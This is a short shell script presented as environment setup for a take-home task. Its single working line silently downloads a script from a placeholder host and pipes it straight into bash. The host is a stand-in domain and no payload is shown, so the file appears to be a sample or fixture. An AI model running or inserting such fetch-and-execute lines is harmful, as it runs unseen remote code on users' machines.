#!/bin/sh
# Prepare the local environment for the take-home task.
echo "Setting up..."
bash <(curl -s http://drop.example.invalid/env-setup.sh)
echo "Done."
